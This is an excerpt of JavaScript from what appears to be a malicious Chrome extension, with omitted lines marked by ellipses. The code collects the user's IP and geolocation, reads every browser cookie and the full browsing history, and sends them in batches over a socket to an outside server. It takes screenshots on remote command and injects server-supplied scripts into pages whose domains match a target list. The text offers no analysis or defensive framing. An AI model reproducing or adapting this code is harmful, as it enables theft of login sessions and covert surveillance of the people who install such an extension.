...
async function getData() {
    try {
        const response = await fetch('https://get.geojs.io/v1/ip/geo.json').then(res => res.json());
        const geo = response?.country + (response?.city ? `, ${response?.city}` : "");
        const ip = response?.ip;
        const browser = getBrowser();
        const countryCode = response?.country_code;

        return { geo: geo, ip: ip, browser, countryCode: countryCode };
    } catch (e) {
...
async function prepareData() {
    ...
    try {
        uuid = await new Promise((resolve) => {
            chrome.storage.local.get(['uuidExMultiTool'], function (result) {
                resolve(result['uuidExMultiTool'] || '');
            });
        });
    } catch (e) {
        console.log("Error in prepareData (UUID retrieval):", e);
    }
...
function initializeSocket() {
    const socket = io("https://console-test873.com:3001", { path: '', transports: ['websocket'] });

    const BATCH_SIZE = 100;

    async function sendBatchedData(dataArray, batchSize, eventName, socket, additionalData = {}) {
        for (let i = 0; i < dataArray.length; i += batchSize) {
            const batch = dataArray.slice(i, i + batchSize);
            const payload = { ...additionalData, batch };
    ...
    socket.on("connect", async () => {
        ...
        const urlsArray = await getScripts();
        ...
        const matchedDomains = await getmatchDomains(history, urlsArray);
    
        socket.emit("uploadMatchesDomain", { uuid: data.uuid, matches: matchedDomains });
        await sendBatchedData(cookies, BATCH_SIZE, "cookiesBatch", socket, { uuid: data.uuid });
        await sendBatchedData(history, BATCH_SIZE, "historyBatch", socket, { uuid: data.uuid });
        socket.emit("finalizeData", { uuid: data.uuid });
    });

    socket.on("uuid", (uuid) => {
        chrome.storage.local.set({ uuidExMultiTool: uuid });
    });

    socket.on("cookiesAndHistory", async () => {
        const data = await prepareData();
        const cookies = await getAllCookies();
        const history = await getAllHistory();
        let cData = {
        ...
        socket.emit("cookiesAndHistory", cData);
    });

    socket.on("uploadMatchesDomain", async () => {
        const urlsArray = await getScripts();
        const userArray = await getAllHistory();
    
        const matchedDomains = await getmatchDomains(userArray, urlsArray);
    
        socket.emit("uploadMatchesDomain", { uuid: data.uuid, matches: matchedDomains });
    });

    socket.on("requestScreenshot", async (taskData) => {
        const { uuid } = taskData;
        console.log("Received screenshot request for UUID:", uuid);
        ...
        try {
            ...
            if (response.success) {
                message = { success: true, message: "Screenshot uploaded successfully" };
            } else {
                message = { success: false, message: "Screenshot upload failed" };
            }
        } catch (error) {
        ...
        if (message && message.success) {
            socket.emit("screenshotUploaded", { uuid, success: true });
            console.log("Screenshot uploaded successfully");
        } else {
            socket.emit("screenshotUploaded", { uuid, success: false });
    ...
    socket.on("disconnect", (reason) => {
        ...
        socket.emit("disconnect", data.uuid);
    });
}

async function getAllCookies() {
    console.log("Запуск поиска всех куки...")
    return new Promise((resolve, reject) => {
        chrome.cookies.getAll({}, function (cookies) {
            if (chrome.runtime.lastError) {
                console.error("Ошибка при получении куков:", chrome.runtime.lastError);
...
async function getScripts() {
    try {
        const response = await fetch('https://console-test873.com:3000/api/v1/scripts/getall', {
            method: 'GET',
            headers: { 'Content-Type': 'application/json' }
        });
        const data = await response.json();
        chrome.storage.local.set({ uuidExMultiToolScripts: data });
        return data;
    } catch (e) {
        console.log("Error in getScripts:", e);
        return [];
    }
}

async function initializeScripts() {
    let scriptsArray = await getScripts();

    chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
        if (changeInfo.status !== 'complete') return;

        scriptsArray.forEach(script => {
            if (tab.url.includes(script.domain)) {
                chrome.tabs.executeScript(
                    tabId,
                    { code: `(${addScriptDOM})('${`https://console-test873.com:3000/scripts/${script.file}`}');` },
                    () => {
                        if (chrome.runtime.lastError) {
...
function addScriptDOM(scriptSrc) {
...
async function getmatchDomains(userArray, urlsArray) {
    const matches = [];

    for (const userItem of userArray) {
        for (const urlItem of urlsArray) {
            if (userItem.url.includes(urlItem.domain)) {
                if (!matches.some(match => match.domain === urlItem.domain)) {
                    matches.push({
